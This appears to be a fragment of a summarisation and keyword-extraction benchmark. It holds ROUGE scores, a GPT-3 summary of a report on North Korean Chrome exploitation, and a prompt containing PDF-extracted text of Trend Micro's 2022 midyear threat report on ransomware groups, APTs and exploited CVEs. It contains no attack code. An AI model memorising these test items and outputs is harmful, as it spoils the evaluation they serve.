"gpt3/lexical/rouge_rouge2": 0.06472491909385114, "gpt3/lexical/rouge_rougeL": 0.1864951768488746, "gpt3/lexical/rouge_rougeLsum": 0.1864951768488746, "gpt3_generated_text": ["The Threat Analysis Group discovered two distinct North Korean government-backed attacker groups on February 10, exploiting a remote code execution vulnerability in Chrome, CVE-2022-0609, in campaigns known as Operation Dream Job and Operation AppleJeus. These campaigns targeted organizations in the news media, IT, cryptocurrency, and fintech industries, using links to a Chrome RCE exploit within hidden iframes on attacker-owned and compromised websites. The exploit kit contained multiple stages, including fingerprinting the target system and serving the RCE exploit, with additional safeguards to prevent recovery of subsequent stages. The groups likely share a supply chain, with each operating with different mission sets. Other North Korean government-backed attackers may also have access to the same exploit kit, as evidenced by their similar tactics and techniques. The campaigns began in January 2022, targeting specific individuals and organizations at specific times, potentially using unique IDs in email campaigns to track targets."]}, {"split_name": "val", "sample_id": "val_32", "prompt_text": "Extract the keywords: Defending the ExpandingAttack SurfaceTrend Micro 2022 Midyear Cybersecurity ReportContents 4 Threat Actors Focus on Advancing Capabilities, Expanding the Digital Attack Surface, and Capitalizing on Current Issues12 The Ransomware Threat Landscape Continues to Evolve with New Players and Lucrative Monetization Methods20 Software Vulnerabilities Threaten to Disrupt the Operations of Businesses29 Old Issues, Unconventional Attacks Plague Cloud Environments35 The Evolving Attack Surface Requires Effective Multilayered Defenses and Security Technologies37 The Threat Landscape in BriefPublished by Trend Micro ResearchStock image used under license from Shutterstock.comThe first half of 2022 saw large sections of the workforce either returning to the physical workplace or transitioning to a hybrid setup consisting of a combination of both work-from-home (WFH) and on-site work. For many organizations that have transitioned their employees to remote working environments during the past couple of years, these changes mean facing an ever-growing attack surface in the new normal, where security teams must contend with the challenge of defending all possible sections of the IT infrastructure.Ransomware developers continued their shift toward more lucrative and efficient monetization methods, particularly the ransomware-as-a-service (RaaS) model that has been credited as one of the key reasons for the rapid spread of ransomware attacks. In the first half of the year, three RaaS threat actors stood above the rest: Conti, LockBit, and BlackCat, each of which saw significantly higher detections in the first half of the year compared to the first half of 2021, indicating that cybercriminals are increasingly turning toward a RaaS partnership due to the benefits it provides for both parties. We also observed relatively new ransomware families such as Black Basta, Nokoyawa, and Hive being used in high-profile attacks on big-game targets.The first half of 2022 also saw the emergence of advanced persistent threat (APT) groups that employed sophisticated toolkits and expansive infrastructure in their campaigns. At the same time, threat actors continued to turn to commodity malware, integrating older tools and malware into their attack routines for their capabilities and reliability. We have also observed that cybercriminals are seemingly looking to expand their operations beyond non-Windows operating systems, with Linux increasingly coming under fire. In their endless pursuit to benefit from any situation, malicious actors also capitalized on the Russia-Ukraine hostilities to launch cyberattacks on either side or prey on people interested in the conflict.Based on Trend Micro\u2122 Zero Day Initiative\u2122 (ZDI) data, there was a rise in the number of published vulnerability advisories in general, as well as in critical- and high-severity flaws during the first half of 2022. We focused on some of the noteworthy critical vulnerabilities that targeted crucial business tools and software that are used in enterprise systems while also taking note of the vulnerabilities that affected macOS and Linux. We also delved into the Data Distribution Service Standard (DDS) and the vulnerabilities that might have a potential impact on the machines and devices that use this standard.The cloud remains a popular target for malicious actors, with some capitalizing on old and persistent issues such as misconfiguration and others attempting to develop more novel and unconventional methods to launch attacks on cloud infrastructure.In our 2022 midyear roundup, we examine the most significant trends and incidents that influenced the cybersecurity landscape in the first half of the year. We also review our 2022 security predictions to see which ones aligned with the trends in the first six months of the year. Through this report, we hope to enlighten users and organizations not just on the different threats that they face but also the robust security measures and policies that they need to consider to protect their environments and systems in the face of a growing attack surface that requires equally capable and extensive security measures.Threat Actors Focus on Advancing Capabilities, Expanding the Digital Attack Surface, and Capitalizing on Current Issues Organizations Express Concern Over the Growing Attack SurfaceOver the past few years, many companies have risen to the challenge of digital transformation byadopting digital technologies to modify their existing business models, processes, and company cultures.This transformation has subsequently created a wider digital attack surface that encompasses a broaderrange of areas, including email inboxes, internet-of-things (IoT) devices, mobile applications, websites,public cloud services, and even the supply-chain infrastructure.In a study we conducted in partnership with Sapio Research, we surveyed 6,297 IT security decision-makers from 29 countries about their thoughts on the risks brought about by the growing attack surface.1We discovered that a significant number (73%) of them were concerned about the size of their digitalattack surface. 37% described their situation as constantly evolving and messy, while another 43%argued that the attack surface is spiraling out of control.Despite these concerns, 62% of the respondents admitted to having blind spots that weaken their securityposture. 37% of the organizations also claimed to have the least insight into cloud assets. 35% said thesame of their insights into networks, while 32% responded that they have the least insight into their end-user assets.It also became clear that a number of these organizations were uncertain about how to proceed given therisks that they face. 38% of respondents identified quantifying cyber risk as their primary challenge, while33% stated that they simply lack the resources to understand and manage these risks. Another 32%cited that they have limited visibility into the areas that are at risk.4 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity Report73% of IT security decision makers are concerned about the digital attack surface.43% argue that the attack surface is spiraling out of control.37% describe the attack surface as constantly evolving and messy.Figure 1. A survey of 6,297 IT security decision-makers reveals that a significant number of them areconcerned about the digital attack surface.Source: Trend Micro survey in partnership with Sapio ResearchAreas where organizations have the least security insight into37% Cloud assets34% Networks32% End-user assetsFigure 2. IT security decision-makers name cloud assets, networks, and end-user assets as the topthree areas where they have the least security insights into.Source: Trend Micro survey in partnership with Sapio ResearchThreat Actors Like Earth Lusca and Earth Berberoka Continue to Use Wide-Ranging Tools and Extensive Infrastructure in Their AttacksThe first half of 2022 saw the continuation of targeted campaigns involving APT groups that play the longgame by employing large infrastructure and integrating different kinds of malware and other tools in theirattacks.One of the prominent APT groups from the first half of 2022 was the Earth Lusca, a threat actor that hasbeen active since mid-20212 and which conducts cyberespionage and financially motivated campaignstargeting a wide range of organizations around the world by using spear-phishing lures and watering holes.5 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportThe group employs infrastructure that can be divided into two clusters. The first is built via rented virtualprivate servers (VPSs) that are used for Earth Lusca\u2019s social engineering attacks. The group also usesthese as their command-and-control (C&C) servers. In particular, Earth Lusca uses the C&C server thatis connected to this cluster to deploy a number of malware families such as Cobalt Strike, ShadowPad,Funny Switch, and Winnti.The second cluster is composed of compromised servers that run older, open-source versions of OracleGlassFish Server. This cluster is used for vulnerability scanning in public-facing servers and buildingtraffic tunnels within the network. The group also uses it as a C&C server for Cobalt Strike.CobaltStrike callback EarthWorm tunnelingExploit reconCompromisedserversPublic-facing serverThreat actor(China)VPN/ProxyserversC&C callbackWatering hole tInternal serversFigure 3. Earth Lusca\u2019s infection routine showing the two clusters the group employs in its attacksVPSsVictim\u2019s computerA large portion of the threat actor\u2019s primary victims seem to be high-value targets such as governmentand educational institutions, political groups, news media, and even Covid-19 research organizations.In April 2022, we published a research paper documenting the activities of an APT group we named EarthBerberoka that primarily targets gambling websites in China.3 The group, which has been active since atleast 2020, uses a wide range of malware families that share the same back-end infrastructure despitetargeting different operating systems (Windows, Linux, and macOS).In addition to its extensive list of malware families, Earth Berberoka employs several different infectionvectors: an allegedly secure chat app called MiMi, a bogus cryptocurrency app, and a website hosting amalicious Adobe Flash Player installer.Another notable intrusion set we encountered in the first half of 2022 is NetDooka, a multicomponentmalware framework that is distributed via a pay-per-install (PPI) service.4 The framework, which containsa loader, a dropper, a protection driver, and a remote access trojan (RAT), uses the PrivateLoader malwarefor distribution. According to a report from Intel471, PrivateLoader infects a user\u2019s machine throughdownloaded pirated software.56 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportFollowing infection, it installs the first NetDooka malware, a dropper component that decrypts and executesthe loader. After scanning the environment, the loader then downloads another dropper component thatis executed by the loader. This dropper will be used for decrypting and executing the final payload, a full-featured RAT that can perform various functions such as starting a remote shell, grabbing browser data,and taking screenshots.The infrastructure of NetDooka makes it an attractive option for clients that want to avail of the PPIbusiness model for their operations while also allowing their operators the opportunity to easily spreadtheir malware.Threat Actors Like Conti Drive Emotet ResurgenceAlthough new malware families often garner the lion\u2019sshare of attention from both the security industry andPredictionsthe general public, older malware, especially thoseIn our 2022 security predictions, wethat have proven to be effective, still pose a threatforesaw that commodity malwareto organizations. In our 2022 security predictions,would grow into a formidable threat aswe mentioned that malicious actors are increasinglyransomware operators continuouslyturning to commodity malware and other tools tointegrate it into their attacks.make their attacks more effective.6 This has turnedout to be an accurate prediction for Emotet, an infamous botnet that is being offered as part of a malware-as-a-service (MaaS) scheme.Arrival1Malicious spam with URL (subject is invoice or payment noti\ufb01cation)A user selecting a URL in malicious spam leads to a download.2 Document with malicious macro executes PowerShell command line to download the payload.Installation3 a. %System%\\<\ufb01le name>.exe b.%AppData%\\Local\\Microsoft\\ Windows\\<\ufb01le name>.exe5 Deletes Zone.Identi\ufb01er ADS6 Creates service (if with admin rights) a. With admin rights b. Without admin rights Service name/Regrun value is the same as <\ufb01le name>.Routines7 List running processes8 Get system andoperation system info9 Send info to C&C server10Create autostart registry /h/k/c/u\\%regrun% (if without admin rights)C&C server sends modules to perform other routines11Execute modules received from C&C server a. Update copy b. Spammer module c. Credential stealer module d. Network propagation moduleFigure 4. Infection chain used in the Emotet infections we analyzed in May 20227 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportEmotet made its debut in 2014 and is known to have been used by operators of other malware such asConti and Ryuk in their attacks. In 2021, its infrastructure was taken down through the collaborative effortof various law enforcement agencies from different countries.7However, the dismantling of its infrastructure did not signal the end of Emotet. Just a few months later, itwas observed being used in a Trickbot campaign.8 In the first half of 2022, we saw a massive uptick inEmotet detections compared to those in the first half of 2021, proof that the botnet is thriving as a resultof threat actors opting to integrate it into their operations. Indeed, researchers from Advintel named Contioperators as one of the reasons behind Emotet\u2019s recent resurgence.913,811148,7011H 20211H 2022030K60K90K120K150KFigure 5. Emotet detections increased by over 10 times in the first half of 2022 compared to the first halfof 2021, likely due to prolific threat actors using it as part of their operations.Source: Trend Micro Smart Protection NetworkBased on our Smart Protection Network (SPN) sensors, majority of the Emotet detections occurred inJapan, with the US, India, Italy, and Brazil rounding up the top five. While this does not necessarilyindicate that Japan is where Emotet is most active (due to the nature of security sensors), it does showthat the malware has high levels of activity in the country.107,6694,8373,7293,4423,006JapanUSIndiaItalyBrazil020K40K60K80K100K120KFigure 6. The countries with the highest number of Emotet detectionsSource: Trend Micro Smart Protection Network8 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportIn May 2022, we analyzed Emotet infections across various regions and discovered that while the attacksstill relied on spam campaigns, it also added small changes to its routine, such as using Excel 4.0 macrosfor its downloading procedure instead of using Visual Basic for Applications (VBA).10 Other changesthat were implemented in these recent Emotet infections include streamlined payloads and additionalobfuscation techniques. Perhaps most importantly, the operators of Emotet have since added CobaltStrike to their arsenal since the botnet\u2019s reappearance, making newer Emotet campaigns more dangerous.Russia-Ukraine Conflict Extends to the Cybercrime SphereOn February 24, 2022, the Russia-Ukraine war began. While there has been much focus on physicalbattles on the ground, it\u2019s important to highlight that cyberattacks targeting both sides were also launchedin the ensuing chaos.11One of the prominent threat actors that became involved early on was Conti, which announced its supportfor the Russian government just a day after the hostilities started. On its leak site, the group announcedthat they would strike back at groups or individuals who launched cyberattacks on Russia, although Contiwould subsequently soften its stance in a succeeding post.Figure 7. Initial statement from the Conti group warning would-be attackers of retaliation should theytarget Russian infrastructureSPN data shows a spike in BazarLoader detections in the first half of 2022 compared to the first half ofthe previous year \u2014 a notable shift since BazarLoader is a key enabler in Conti campaigns.9 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity Report756861H 20211H 2022Figure 8. There were nearly 10 times as many BazarLoader detections in the first half of 20220200400600800compared to the first half of 2021.Source: Trend Micro Smart Protection NetworkThe Stormous ransomware gang, a group of Arabic-speaking cybercriminals, also announced its supportfor Russia12 and declared that it would target Ukrainian government institutions as part of its plans.Our analysis of the malware used by Stormous reveals that the group uses it to deploy different kinds ofcustom payloads to its victim through remote uploading and resources such as Pastebin.Alongside ransomware groups becoming involved, security researchers observed attacks that, althoughnot directly connected to the ongoing war, were being launched on Ukrainian organizations, websites,and infrastructure even before the conflict began.In January and February 2022, a wave of spear-phishing emails was sent to Ukrainian targets \u2014 ostensiblyfrom Ukrainian organizations such as the National Healthcare Service and the police force \u2014 containingattachments that download and execute the OutSteel and SaintBot malware.13 It\u2019s possible that thesecampaigns were carried out for information-gathering purposes as a precursor to the invasion.On January 13 and 14, 2022, threat actors launched a direct attack on approximately 70 Ukrainiangovernment websites, leading to the defacement of website content and system corruption via themalware WhisperGate.14 It is suspected that these attacks were enabled via the content managementsystem OctoberCMS, supply-chain attacks, and the exploitation of the Log4j vulnerability.15At first glance, these incidents belie the complexity of the attacks launched on either side of the war. Asevidenced by a March 2022 campaign that we analyzed, however, these cyberattacks are not a one-waystreet. In this campaign, operators used a piece of malware called RuRansom designed to infect Russiantargets. Although its name implies otherwise, RuRansom is not an example of ransomware but a wiperdesigned to destroy its victim\u2019s data and backup files. Our discovery of numerous versions of RuRansomindicates that the malware is still under development.10 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportAlthough several ransomware groups became involved, it would be a mistake to think that ransomwaregangs were the only ones to take part in the Russia-Ukraine war. For example, hacktivist collectiveAnonymous took part in the cyber conflict by targeting Russian assets and information in attacks thatincluded publishing confidential files from the Russian central bank, taking over state-controlled television,and leaking the personal data of Russian military personnel.16Other malicious actors, while not directly targeting either side of the conflict, still attempted to capitalizeon the situation. Through our honeypot, we found war-related spam emails aiming to take advantage ofthe situation under the guise of asking for donations and using scams to create bogus recipients of suchdonations. Some of these spam emails drop malware such as Ave Maria as an attachment.17Figure 9. A scam email asking recipients for donations to help with Ukrainian relocations11 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportThe Ransomware Threat Landscape Continues to Evolve with New Players and Lucrative Monetization Methods LockBit, Conti, and BlackCat Operators Continue to Employ the Profitable RaaS SchemeThe advent of RaaS has resulted in would-becybercriminals having access to the tools andPredictionsinfrastructure that would not have been availableWe predicted that ransomwareto them under ordinary circumstances.18 One of theoperators would implement modern andunique aspects of the RaaS model is the relationshipsophisticated extortion methods whilebetween the developers and their affiliates who actalso going after more prominent targets.as middlemen. Affiliates are also responsible for thewould grow into a formidable threat asactual infections and split ransom payment with theransomware operators continuouslydevelopers. This kind of setup provides developersintegrate it into their attacks.additional time to evolve their malware and toolswhile also affording them protection from the scrutiny of security researchers and law enforcement. Onthe other hand, affiliates profit from ransomware attacks without the extensive legwork and infrastructureneeded to initiate expansive ransomware campaigns.Our telemetry data shows that over 50 active RaaS and extortion groups and more than 1,200 organizationswere victimized by ransomware in the first half of the year.12 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportActive RaaS and extortion groupsVictim organizations571,205Figure 10. The number of active RaaS and extortion groups and victim organizations of successful03006009001.2K1.5Kransomware attacks in the first half of 2022Source: RaaS and extortion groups\u2019 leak sitesLockBit, Conti, and BlackCat were the major players in the RaaS field for the first half of 2022.19 Basedon SPN data, we observed a sharp increase in detections from each of these malware families in the firsthalf of this year. Black Cat, a relatively new ransomware that was initially reported at the tail end of 2021,understandably saw practically nonexistent detections in 2021 before the increase in 2022. However,even older ransomware such as LockBit and Conti saw major increases, with LockBit seeing over fivetimes and Conti nearly twice the number of detections in the first half of 2022 in contrast to the first halfof the previous year.1H 20221H 2021LockBitContiBlackCat3411,843 6221,090 21,39705001K1.5K2K1H 20211H 2022Figure 11. LockBit, Conti, and BlackCat saw a significant increase in detections in the first six months of 2022 compared to the first half of the previous year: The detectionnumbers for LockBit, Conti, and BlackCatSource: Trend Micro Smart Protection NetworkLockBit, which has been active since 2019 and was initially known as the ABCD ransomware, is thegroup with the highest number of detections.20 In 2020, LockBit launched its RaaS affiliate program usinga leak site and a few months later began using the double extortion model where the attacker threatens13 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity Reportto publicly expose data in addition to encrypting files. In 2021, one of the prominent incidents involvingLockBit occurred when it launched an attack on tech services firm Accenture, even going as far as listingthe company on its leak site.21LockBit has been a staple in the ransomware scene since its debut, with its operators constantly evolvingits capabilities to the point where the performance of its RaaS service has become one of the group\u2019sselling points due to its speed and efficiency. LockBit\u2019s network has also garnered popularity for itscapability and trustworthiness.LockBit offers multiple options for infection routines depending on the affiliates involved in the operation,their purpose, and how they gain access to their target\u2019s system. For example, if an affiliate managesto gain access to a virtual private network (VPN) server using brute-force methods, LockBit\u2019s operatorsmight provide an infection routine that is based on remote access service (RAS). On the other hand, thegroup might offer a PowerShell script to attackers that gain access to a compromised Internet InformationServices (IIS) server. In addition to its encryption routines, LockBit attacks were also found to havedeployed the post-exploitation tool Mimikatz to gather additional credentials.CompromisedIIS serverPowerShellscriptBackdoor(PowerShell Empire)LockBitransomwareBrute-forced VPN serverSMB/MicrosoftRASLockBitransomwarePowerShell commandLockBitransomwareFigure 12. Two of the infection routines used by LockBit: one for when its operators manage tocompromise an IIS server, and one for when they manage to compromise a VPN server viabrute-force methodsTouted as the successor to the notorious Ryuk ransomware,22 Conti hit its stride in 2021 with a number ofprominent attacks, including incidents where it targeted healthcare institutions in May.23Like many modern ransomware families, Conti employs more than one method to gain initial access toa victim\u2019s system. Phishing emails remain a common infiltration technique, with attackers using GoogleDrive links to drop BazarLoader and the attack eventually leading to an infection. Conti can also arrive ona target\u2019s machine by exploiting vulnerabilities like the FortiGate firewall vulnerabilities CVE-2018-1337924and CVE-2018-13374,25 as well as various ProxyShell Microsoft Exchange vulnerabilities.2614 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportOnce inside the system, tools like Whoami, Nltest, and Net are used to provide the attackers somesystem information, such as the rights and permissions they have gained via the compromised machine.At the same time, the threat actors actively search for files that they can exfiltrate for use in their doubleextortion technique. If the attackers that deployed Conti find that they need to have access to greaterprivileges, they might also use exploits like Zerologon27 for privilege escalation.In February 2022, an alleged security researcher leaked some of the ransomware group\u2019s files anddocuments, revealing information such as the size and leadership of the group.28 More importantly,they unearthed the code used by Conti operators for their components and infrastructure, such as theadministrator panel, a decryptor, and even Conti Locker v2.Nevertheless, the leak of such information is a double-edged sword: While it could be instrumental forresearchers to use it for keeping track of and gaining insight into Conti\u2019s operation, malicious actors canuse the leaked source codes to build their own startup ransomware operation.Initial Entry and ExecutionPrivilege EscalationCommand and ControlFirewall exploitCobalt StrikePrintNightmareZeroLogonValid accountsAnydeskPhishing emailBazarLoader/ BazarBackdoorCredential AccessLateral MovementNetwork DiscoveryNetscanShareFinderKerberoastingNet-GPPPasswordKerberoastingAnydeskProcDumpProcDumpProcDumpPSExecImpactContiLateral Movement andDefense EvasionCreate scheduledtask on remote systemsCobeacon, KillAV, ContiKillAVEx\ufb01ltrationRcloneFigure 13. The infection chain used in a typical Conti attackAlthough relatively new to the ransomware scene compared to LockBit and Conti, BlackCat still managedto make waves in the months that it was active by going beyond the typical double extortion scheme usedby modern ransomware groups. Instead, BlackCat resorted to a \u201ctriple extortion\u201d scheme29 where it notonly threatened to encrypt files and leak sensitive data but also warned its victims that it would launchdistributed denial-of-service (DDoS) attacks on their infrastructure if the group\u2019s demands are not met.3015 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportBlackCat\u2019s operators typically exploit exposed and vulnerable applications to gain entry into their targetsystem. They then use third-party frameworks and toolsets such as Cobalt Strike to deliver the ransomware.In April 2022, we launched an investigation into BlackCat via the Trend Micro Vision One\u2122 platform, wherewe gathered information about its routine. We found that the malicious actors were actively exploiting theMicrosoft Exchange Server vulnerability CVE-2021-3120731 to insert a web shell into the victim\u2019s server forremote access. This allows the attackers the ability to remotely perform different tasks like stealing dataand dropping malicious tools. The attackers then use these tools to move laterally within the system, scanthe environment, and prepare it for eventual BlackCat infection.Due to BlackCat\u2019s sophistication as the first professional ransomware family to be written in Rust, a secureprogramming language that has concurrent processing capabilities, as well as its unique monetizationmethod, extensive infrastructure, and wide array of supplementary tools in its attacks, it has the potentialto become a staple in the RaaS scene in the foreseeable future.Based on both our data and data from leak sites, we were able to note that these ransomware familiesare used mainly to target small businesses with up to 200 employees at most as well as medium-sizedbusinesses with up to 1,000 employees. The likely reason for this is that these types of organizations haveless resources and a smaller workforce to properly deal with cyberattacks.32Linux Systems Become a Prime Target for Ransomware OperatorsLinux systems present an attractive target formalicious actors that are either looking to expandPredictionstheir reach or have decided to concentrate onOur 2022 security predictions anticipatedspecific types of infrastructure, such as servers andthat ransomware threat actors wouldembedded systems where Linux is expected to seeexpend more effort on targeting servers,growth over the next few years.33server components, and related services.We observed a 75% increase in ransomware attacks targeting Linux-based machines in the first half of2022 as opposed to the first half of 2021, lending more evidence to our assumption that malicious actorsare focusing more of their efforts on Linux.16 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity Report1,1211,9611H 20211H 202205001K1.5K2KFigure 14. Linux ransomware detections grew significantly in the first half of 2022 as opposed to the first half of 2021: A comparison of ransomware detections for Linux-based machinesSource: Trend Micro Smart Protection NetworkThe VMware hypervisor ESXi came under heavy fire in the first half of 2022. Still, there is nothing newabout cybercriminals targeting ESXi. RansomEXX34, for example, has been exploiting ESXi vulnerabilitiesin its campaigns since at least 202135 \u2014 and it seems that other threat actors are now following suit.In October 2021, LockBit\u2019s operators announced a Linux-based variant, LockBit Linux-ESXi Lockerversion 1.0, in an underground forum. This variant targets ESXi servers through a combination of AdvancedEncryption Standard (AES) and elliptic-curve cryptography (ECC) algorithms to encrypt data. Since then,samples of this variant have been found in the wild.In May 2022, a new ransomware variant named Cheerscrypt was also found targeting devices using ESXi.36Based on the source code of the Babuk ransomware that was leaked in September 2021,37 Cheerscryptencrypts log files and other VMware-related files using the double extortion technique.Although neither LockBit Linux-ESXi Locker version 1.0 nor Cheerscrypt deviates from the typical doubleextortion scheme used by many other ransomware variants, the potential impact of an infection is notablein this case since ESXi servers are widely used by enterprises for server virtualization. Organizationscan also use these servers to host multiple virtual machines (VMs) where they keep important data. Thismeans that they are often part of an organization\u2019s critical infrastructure, and therefore any successfulattack on these components can deal great damage to an organization.17 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportBig Game-Hunting Ransomware Families such as Black Basta and Nokoyawa Hit Organizations Across the GlobeWe spotted ransomware operators setting their sights on businesses that have the capacity to pay sizeableransom demands. Operators of the Black Basta ransomware38 struck hard and fast, hitting nearly 50organizations in a span of a couple of months in early 2022.39 Black Basta originated in April 2022, whena user with the name Black Basta posted on some major underground forums that they were looking forcorporate network access credentials for organizations in the United States, Canada, United Kingdom,Australia, and New Zealand. The user also mentioned that they were offering a share of the profits to anypotential partners.Currently, information on the scope and structure of the malicious actor\u2019s operation is limited. Given BlackBasta\u2019s initial advertisement, however, it is likely that the group uses stolen credentials to gain access toits victim\u2019s systems. It then proceeds to perform its encryption routine, first by deleting shadow copies viavssadmin.exe and then booting the device in safe mode. It then deletes the service called Fax, creates anew one using the malware\u2019s path, and adds it to the registry for persistence. Finally, it shuts down andreboots the target\u2019s machine in Safe Mode with Networking using the compromised service to encryptfiles. One of the notable characteristics of Black Basta is that its ransom note is hard-coded into themalware, suggesting that its operators could be using unique binaries for each of its victims.Figure 15. The wallpaper created by Black Basta using the .jpg file that is droppedin the %temp% folder18 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportSecurity researchers also pointed out connections between Black Basta and other ransomware and APTgroups. A tweet from the MalwareHunterTeam described many similarities between Black Basta andConti,40 while Trend Micro researchers managed to find correlations between Black Basta and QakBot.41In the latter part of 2021, the Hive ransomware initiated a spate of attacks on the US healthcare sector,with some reports stating that over 300 organizations were hit in the ransomware\u2019s first hundred daysof operation.42 In 2022, we encountered Nokoyawa, a ransomware with several similarities to Hive.43 Forexample, these ransomware families share common tools and techniques, including the use of CobaltStrike during the arrival phase of the attack and the integration of tools such as the anti-rootkit scannersGMER and PC Hunter as part of defense evasion maneuvers.However, Hive and Nokoyawa also feature different characteristics, particularly in their code (they usedifferent languages to compile the binary) and packing method: Hive variants are packed using UPX whileNokoyawa does not use any packer whatsoever.Most of Nokoyawa\u2019s targets were in the South American region, particularly in Argentina.19 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportSoftware Vulnerabilities Threaten to Disrupt the Operations of Businesses The Number of Critical- and High-Severity Vulnerabilities Increased During the First Half of 2022The first half of 2022 saw a sizeable jump in the number of vulnerabilities published by CVE.org: 12,380CVE Records, a sizeable jump from the 9,420 CVE Records that were published during the first half of2021.44 The same trend repeated itself in the number of vulnerabilities disclosed via the Trend Micro ZDIprogram, which published advisories on 944 vulnerabilities, an approximately 23% increase from the 770vulnerabilities in the first half of 2021.7709441H 20211H 202202004006008001KFigure 16. There was an almost 23% increase in the number of vulnerability advisories publishedin the first half of 2022 compared to the same period in the previous year.Source: Trend Micro\u2122 Zero Day Initiative\u2122Vulnerabilities with a high-severity rating made up the greatest portion (68%) of the published vulnerabilities.Both critical- and high-severity vulnerabilities saw large increases, while medium-severity vulnerabilitieswere the only ones that saw a decrease from the same period in 2021.20 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportGiven these trends, we recommend that organizations employ an efficient, risk-based approach thatfocuses on vulnerabilities affecting their environment, then verify whether these vulnerabilities have publicproofs of concept or are being actively exploited in the wild by using resources such as the KnownExploited Vulnerabilities Catalog by the Cybersecurity and Infrastructure Security Agency (CISA).45800553107 2022Figure 17. Critical-, high-, and low-severity vulnerabilities saw an increase in the first half of 2022, while medium-severity vulnerabilities experienced a slight dip: The severity breakdown, based on the CVSS,of disclosed vulnerabilities in the first half of 2021 and 2022Source: Trend Micro ZDI programCVE-2017-14100,46 a critical-severity vulnerability that could allow shell command injections if successfullyexploited and affects certain versions of Asterisk, an open-source software used to build communicationsapplications, had the highest number of exploit detections in the first half of 2022 based on Trend Micro\u2122TippingPoint\u00ae Threat Protection System sensors. This was followed by the OpenSSL memory leak flawCVE-2014-3567 and the IIS web server folder traversal vulnerability CVE-2000-0884, which had exploitdetections of over 9 and 4 million, respectively. The presence of these older vulnerabilities (with exploitdetections numbering in the millions in some cases) among the most exploited bugs in the first half ofthe year is evidence that many organizations still have difficulty implementing crucial updates to theirsoftware. Even worse, it might mean that many organizations still completely ignore such updates.Meanwhile, CVE-2022-30190 (also known as Follina),47 a high-severity remote code execution (RCE)vulnerability affecting Microsoft Windows Support Diagnostic Tool (MSDT), has reportedly been used inattacks on high-value targets in European countries and the US.48 Microsoft has since patched this flawin its June 2022 security update.4921 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportRule IDCVE ID numberHitsAffected products29739CVE-2017-1410015,200,80917056CVE-2014-35679,107,139Asterisk 11.x before 11.25.2, 13.x before 13.17.1, and 14.x before 14.6.1 and Certified Asterisk 11.x before 11.6-cert17, and 13.x before 13.13-cert5OpenSSL before 0.9.8zc, 1.0.0 before 1.0.0o, and 1.0.1 earlier and SharePoint Services 3.0 SP1 and SP2.CVE-2011-1264Microsoft Windows Server 2003 SP2 and Server 2008 Gold, earlier and SharePoint Services 3.0 SP1 and SP2Microsoft Forefront Unified Access Gateway (UAG) 2010 Gold, 2010 Update 1, and 2010 Update 2CVE-2017-0068Microsoft Edge10146CVE-2010-2861648,690Adobe ColdFusion 9.0.1 and earlierCVE-2013-3336Adobe ColdFusion 9.0, 9.0.1, 9.0.2, and 1031852CVE-2014-0224597,386OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h6161CVE-2008-1451580,030Microsoft Windows 2000 SP4 and Server 2003 SP1 and SP231936CVE-2018-10562518,502Dasan GPON home routersTable 1. The top vulnerabilities in terms of exploit detections in the first half of 2022Source: Trend Micro\u2122 TippingPoint\u00ae Threat Protection SystemMajor Vulnerabilities Affect Important Business Tools and SoftwareVulnerabilities involving critical software, tools, and components are often some of the most dangeroustypes of flaws due to the nature of what they affect. Furthermore, data from Vision One shows thatapproximately 85% of all companies subscribed to the service were exposed to highly exploitablevulnerabilities.22 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportCompany countCompanies exposed to highly exploitable vulnerabilities4,8674,138Figure 18. 4,138 out of 4,867 (85%) of all companies subscribed to Vision One were prone to highlyexploitable vulnerabilities: A snapshot of Vision One data from the first week of August 202201K2K3K4K5K2021 saw the rise of CVE-2021-44228 (also known as Log4Shell),50 a vulnerability that affected the Java-based logging library, Apache Log4j. The disclosure of Log4Shell shook the cybersecurity landscape dueto the ubiquity of the software it affected and its integration into different systems, which made it difficultfor organizations to determine how they were affected.51 The first half of 2022 saw more vulnerabilitiesaffecting critical enterprise software, with perhaps the most notable being the Spring4Shell vulnerability.On March 31, 2022, creators of the Spring Framework, a widespread open-source Java frameworkcommonly used in enterprise applications, published information on CVE-2022-22965,52 a critical zero-day vulnerability (colloquially known as Spring4Shell due to its similarities to Log4Shell) that affects anumber of dependencies, such as setups that run on Spring Framework versions before 5.2.20, 5.3.18,and Java Development Kit (JDK) 9 and higher.The Spring4Shell vulnerability typically occurs when special objects or classes are exposed to certainconditions. Attackers that want to directly access an object can do so by specifying the class variable intheir requests. In addition, access to the child properties of an object via class objects results in attackersbeing able to gain access to high-value objects in the system by following the chains of properties.53We have seen Spring4Shell being used in attackattempts in the wild as early as April 2022. OnePredictionsof these attack attempts involved the exploitationIn our 2022 Security predictions, weofthe vulnerabilityto deploy cryptocurrency-anticipated that threat actors would bemining malware. In this scenario, an attacker firstable to weaponize exploits in a very shortdetermines the operating system of the targetedperiod, launching attacks even beforemachine using a string check. Once the operatingpatches can be released.system is identified, the encoded payload (a webshell that, when decoded, results in a Spring4Shell web shell) is executed. Afterward, a PowerShellcommand is executed. This fetches a script designed to download and execute a cryptocurrency mineron the infected machine.5423 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity 